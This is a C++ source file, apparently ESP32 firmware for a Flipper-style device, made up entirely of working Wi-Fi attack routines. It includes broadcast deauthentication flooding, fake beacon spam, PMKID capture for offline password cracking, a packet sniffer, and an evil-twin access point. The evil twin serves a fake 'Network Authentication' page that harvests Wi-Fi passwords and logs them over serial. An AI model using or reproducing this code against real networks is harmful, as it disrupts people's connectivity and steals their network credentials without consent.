#include "WiFiAttacks.h"
#include <WebServer.h>
#include <string.h>
#include <stdio.h>

// ─── Static member definitions ────────────────────────────────────────────────

volatile bool   WiFiAttacks::monitor_running   = false;
volatile bool   WiFiAttacks::evil_twin_running = false;
PMKIDCallback   WiFiAttacks::pmkid_cb;
PacketCallback  WiFiAttacks::packet_cb;
uint8_t         WiFiAttacks::pmkid_target_bssid[6] = {0};
bool            WiFiAttacks::pmkid_targeting   = false;
char            WiFiAttacks::pmkid_result[65]  = {0};
volatile bool   WiFiAttacks::pmkid_found       = false;

static WebServer* evil_twin_server = nullptr;
static String captured_creds = "";
static char   evil_twin_ssid[33] = {0};

// ─── Deauth frame builder ─────────────────────────────────────────────────────

void WiFiAttacks::build_deauth_frame(uint8_t* frame, const uint8_t* bssid,
                                      const uint8_t* client, uint16_t reason) {
    // 802.11 deauthentication frame
    frame[0] = 0xC0;              // type: management, subtype: deauth
    frame[1] = 0x00;
    frame[2] = 0x00; frame[3] = 0x00; // duration
    memcpy(frame + 4,  client, 6);    // DA (client or broadcast)
    memcpy(frame + 10, bssid,  6);    // SA (AP)
    memcpy(frame + 16, bssid,  6);    // BSSID
    frame[22] = 0x00; frame[23] = 0x00; // seq/frag
    frame[24] = reason & 0xFF;          // reason code
    frame[25] = (reason >> 8) & 0xFF;
}

// ─── Deauth ──────────────────────────────────────────────────────────────────

void WiFiAttacks::deauth(const uint8_t* bssid, uint8_t channel, uint16_t count) {
    WiFi.mode(WIFI_STA);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t frame[26];

    for(uint16_t i = 0; i < count; i++) {
        // AP → broadcast (disconnects all clients)
        build_deauth_frame(frame, bssid, broadcast, 7); // reason 7: Class3 frame
        esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
        delay(2);

        // Broadcast → AP (impersonate all clients disconnecting)
        build_deauth_frame(frame, broadcast, bssid, 7);
        esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
        delay(2);
    }
}

// ─── Beacon frame builder ─────────────────────────────────────────────────────

void WiFiAttacks::build_beacon_frame(uint8_t* frame, size_t* len,
                                      const char* ssid, const uint8_t* bssid,
                                      uint8_t channel) {
    size_t ssid_len = strlen(ssid);
    if(ssid_len > 32) ssid_len = 32;

    size_t frame_len = 0;

    // 802.11 header
    frame[0] = 0x80; frame[1] = 0x00; // beacon frame
    frame[2] = 0x00; frame[3] = 0x00; // duration
    memset(frame + 4, 0xFF, 6);        // DA: broadcast
    memcpy(frame + 10, bssid, 6);      // SA
    memcpy(frame + 16, bssid, 6);      // BSSID
    frame[22] = 0x00; frame[23] = 0x00; // seq
    frame_len = 24;

    // Fixed parameters (8 bytes timestamp + 2 interval + 2 capabilities)
    memset(frame + frame_len, 0x00, 8); // timestamp
    frame_len += 8;
    frame[frame_len++] = 0x64; frame[frame_len++] = 0x00; // interval: 100 TU
    frame[frame_len++] = 0x11; frame[frame_len++] = 0x04; // capabilities: ESS+Privacy

    // SSID element
    frame[frame_len++] = 0x00;           // element ID: SSID
    frame[frame_len++] = (uint8_t)ssid_len;
    memcpy(frame + frame_len, ssid, ssid_len);
    frame_len += ssid_len;

    // Supported rates
    uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};
    memcpy(frame + frame_len, rates, sizeof(rates));
    frame_len += sizeof(rates);

    // DS parameter (channel)
    frame[frame_len++] = 0x03;
    frame[frame_len++] = 0x01;
    frame[frame_len++] = channel;

    *len = frame_len;
}

// ─── Beacon spam ─────────────────────────────────────────────────────────────

void WiFiAttacks::beacon_spam_targeted(const char* ssid, uint16_t count) {
    WiFi.mode(WIFI_STA);
    uint8_t bssid[6];
    uint8_t frame[256];
    size_t frame_len;

    // Random BSSID with locally administered bit
    esp_fill_random(bssid, 6);
    bssid[0] = (bssid[0] & 0xFE) | 0x02; // locally administered, unicast

    build_beacon_frame(frame, &frame_len, ssid, bssid, 6);

    for(uint16_t i = 0; i < count; i++) {
        bssid[5] = (uint8_t)i; // vary last byte
        build_beacon_frame(frame, &frame_len, ssid, bssid, 6);
        esp_wifi_80211_tx(WIFI_IF_STA, frame, frame_len, false);
        delay(5);
    }
}

void WiFiAttacks::beacon_spam_random(uint16_t count) {
    WiFi.mode(WIFI_STA);
    uint8_t bssid[6];
    uint8_t frame[256];
    size_t frame_len;

    const char* names[] = {
        "FBI Surveillance Van", "Police Monitoring Unit",
        "NSA Mobile Unit 42",   "CIA_Field_Op",
        "Totally Not Watching", "Nothing to See Here",
        "Your Neighbors Router","Free_Public_WiFi",
    };
    const size_t name_count = sizeof(names) / sizeof(names[0]);

    for(uint16_t i = 0; i < count; i++) {
        esp_fill_random(bssid, 6);
        bssid[0] = (bssid[0] & 0xFE) | 0x02;
        const char* ssid = names[i % name_count];
        build_beacon_frame(frame, &frame_len, ssid, bssid, (i % 13) + 1);
        esp_wifi_80211_tx(WIFI_IF_STA, frame, frame_len, false);
        delay(10);
    }
}

// ─── PMKID capture ────────────────────────────────────────────────────────────

bool WiFiAttacks::extract_pmkid(const uint8_t* payload, uint32_t len,
                                  uint8_t* pmkid_out, uint8_t* bssid_out) {
    // EAPOL RSN IE with PMKID: look for EAPOL-Key frames (type 0x888E)
    // In 802.11 data frame: LLC+SNAP header, then EtherType 0x888E
    if(len < 36) return false;

    // Find EtherType 0x888E in LLC/SNAP
    for(uint32_t i = 0; i < len - 4; i++) {
        if(payload[i] == 0x88 && payload[i+1] == 0x8E) {
            // EAPOL frame starts at i+2
            const uint8_t* eapol = payload + i + 2;
            uint32_t eapol_len = len - i - 2;

            if(eapol_len < 5) continue;
            // EAPOL-Key: type=3
            if(eapol[1] != 0x03) continue;

            // Key Data Length
            if(eapol_len < 99) continue;
            uint16_t kd_len = (uint16_t)(eapol[97]) << 8 | eapol[98];
            if(kd_len < 22 || eapol_len < (uint32_t)(99 + kd_len)) continue;

            // Look for PMKID RSN KDE: OUI 00:0F:AC type 04
            const uint8_t* kd = eapol + 99;
            for(uint16_t k = 0; k + 6 < kd_len; k++) {
                if(kd[k] == 0xDD && kd[k+2] == 0x00 &&
                   kd[k+3] == 0x0F && kd[k+4] == 0xAC && kd[k+5] == 0x04) {
                    // PMKID is 16 bytes starting at kd[k+6]
                    if(k + 22 <= kd_len) {
                        memcpy(pmkid_out, kd + k + 6, 16);
                        // BSSID from 802.11 header (bytes 10–15 of the raw frame)
                        if(len >= 16) memcpy(bssid_out, payload + 10, 6);
                        return true;
                    }
                }
            }
        }
    }
    return false;
}

static void IRAM_ATTR promiscuous_cb_static(void* buf, wifi_promiscuous_pkt_type_t type) {
    WiFiAttacks::promiscuous_cb(buf, type);
}

void WiFiAttacks::promiscuous_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if(type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* payload = pkt->payload;
    uint32_t len = pkt->rx_ctrl.sig_len;

    if(monitor_running && packet_cb) {
        packet_cb(payload, len, pkt->rx_ctrl.channel);
        return;
    }

    if(!pmkid_found) {
        uint8_t pmkid[16];
        uint8_t bssid[6];
        if(extract_pmkid(payload, len, pmkid, bssid)) {
            if(pmkid_targeting) {
                if(memcmp(bssid, pmkid_target_bssid, 6) != 0) return;
            }
            for(int i = 0; i < 16; i++) {
                snprintf(pmkid_result + i*2, 3, "%02x", pmkid[i]);
            }
            pmkid_found = true;

            if(pmkid_cb) {
                char bssid_str[13];
                for(int i = 0; i < 6; i++) snprintf(bssid_str + i*2, 3, "%02x", bssid[i]);
                pmkid_cb(pmkid_result, bssid, "");
            }
        }
    }
}

char* WiFiAttacks::capture_pmkid_targeted(const uint8_t* bssid,
                                            uint8_t channel,
                                            uint32_t timeout_ms) {
    memcpy(pmkid_target_bssid, bssid, 6);
    pmkid_targeting = true;
    pmkid_found = false;

    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promiscuous_cb_static);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    uint32_t start = millis();
    while(!pmkid_found && (millis() - start) < timeout_ms) {
        delay(10);
    }

    esp_wifi_set_promiscuous(false);
    pmkid_targeting = false;

    if(pmkid_found) {
        char* out = (char*)malloc(65);
        if(out) strncpy(out, pmkid_result, 65);
        pmkid_found = false;
        return out;
    }
    return nullptr;
}

void WiFiAttacks::capture_pmkid_passive(uint32_t duration_ms, PMKIDCallback cb) {
    pmkid_cb = cb;
    pmkid_targeting = false;
    pmkid_found = false;

    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promiscuous_cb_static);

    uint32_t start = millis();
    uint8_t channel = 1;
    while((millis() - start) < duration_ms) {
        // Channel hop every 200ms
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        delay(200);
        channel = (channel % 13) + 1;
    }

    esp_wifi_set_promiscuous(false);
    pmkid_cb = nullptr;
}

// ─── Evil Twin + Captive Portal ───────────────────────────────────────────────

static const char CAPTIVE_HTML[] =
    "<!DOCTYPE html><html><head><title>Network Login</title>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>body{font-family:Arial;display:flex;justify-content:center;"
    "align-items:center;height:100vh;margin:0;background:#f0f0f0;}"
    ".box{background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px #aaa;width:300px;}"
    "h2{margin:0 0 20px;color:#333}input{width:100%;padding:8px;margin:5px 0 15px;"
    "border:1px solid #ccc;border-radius:4px;box-sizing:border-box}"
    "button{width:100%;padding:10px;background:#007bff;color:#fff;border:none;"
    "border-radius:4px;cursor:pointer}button:hover{background:#0056b3}</style></head>"
    "<body><div class='box'><h2>Network Authentication</h2>"
    "<p>Please enter your Wi-Fi password to continue.</p>"
    "<form action='/submit' method='POST'>"
    "<label>Network Name</label><input name='ssid' readonly>"
    "<label>Password</label><input type='password' name='pass' placeholder='Wi-Fi Password'>"
    "<button type='submit'>Connect</button></form></div></body></html>";

void WiFiAttacks::start_evil_twin(const char* ssid, uint8_t channel) {
    strncpy(evil_twin_ssid, ssid, 32);
    evil_twin_running = true;

    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid, nullptr, channel, 0, 4); // open AP, max 4 clients

    if(evil_twin_server) {
        delete evil_twin_server;
    }
    evil_twin_server = new WebServer(80);

    // All paths → captive portal
    evil_twin_server->onNotFound([]() {
        evil_twin_server->send(200, "text/html", CAPTIVE_HTML);
    });

    evil_twin_server->on("/submit", HTTP_POST, []() {
        String pass = evil_twin_server->arg("pass");
        String ssid_arg = evil_twin_server->arg("ssid");

        if(pass.length() > 0) {
            // Log credential over serial to Flipper
            char cred[256];
            snprintf(cred, sizeof(cred),
                "{\"cred\":true,\"ssid\":\"%s\",\"user\":\"\",\"pass\":\"%s\"}",
                ssid_arg.length() > 0 ? ssid_arg.c_str() : evil_twin_ssid,
                pass.c_str());
            Serial.println(cred);
            captured_creds += pass + "\n";
        }
        // Redirect to "success" to appear legitimate
        evil_twin_server->sendHeader("Location", "http://connectivitycheck.gstatic.com/generate_204");
        evil_twin_server->send(302, "text/plain", "");
    });

    // Android/iOS captive portal detection responses
    evil_twin_server->on("/generate_204", []() {
        evil_twin_server->send(200, "text/html", CAPTIVE_HTML);
    });
    evil_twin_server->on("/hotspot-detect.html", []() {
        evil_twin_server->send(200, "text/html", CAPTIVE_HTML);
    });
    evil_twin_server->on("/ncsi.txt", []() {
        evil_twin_server->send(200, "text/plain", "Microsoft NCSI");
    });

    evil_twin_server->begin();
}

void WiFiAttacks::evil_twin_tick() {
    if(evil_twin_server) evil_twin_server->handleClient();
}

// ─── Monitor mode ─────────────────────────────────────────────────────────────

void WiFiAttacks::start_monitor() {
    monitor_running = true;
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promiscuous_cb_static);

    packet_cb = [](const uint8_t* payload, uint32_t len, uint8_t channel) {
        if(len < 24) return;
        // Extract source and destination MACs from 802.11 header
        char src[18], dst[18];
        snprintf(src, sizeof(src), "%02x:%02x:%02x:%02x:%02x:%02x",
            payload[10], payload[11], payload[12],
            payload[13], payload[14], payload[15]);
        snprintf(dst, sizeof(dst), "%02x:%02x:%02x:%02x:%02x:%02x",
            payload[4], payload[5], payload[6],
            payload[7], payload[8], payload[9]);
        char log[256];
        snprintf(log, sizeof(log),
            "{\"pkt\":{\"src\":\"%s\",\"dst\":\"%s\",\"ch\":%u,\"len\":%lu}}",
            src, dst, channel, (unsigned long)len);
        Serial.println(log);
    };
}

void WiFiAttacks::stop_monitor() {
    esp_wifi_set_promiscuous(false);
    packet_cb = nullptr;
    monitor_running = false;
}

void WiFiAttacks::monitor_tick() {
    // Callbacks fire via promiscuous ISR — nothing to poll here
    delay(1);
}

// ─── Stop all ─────────────────────────────────────────────────────────────────

void WiFiAttacks::stop_all() {
    esp_wifi_set_promiscuous(false);
    packet_cb = nullptr;
    pmkid_cb = nullptr;
    monitor_running = false;
    evil_twin_running = false;
    pmkid_found = false;
    pmkid_targeting = false;

    if(evil_twin_server) {
        evil_twin_server->stop();
        delete evil_twin_server;
        evil_twin_server = nullptr;
    }

    WiFi.mode(WIFI_STA);
}
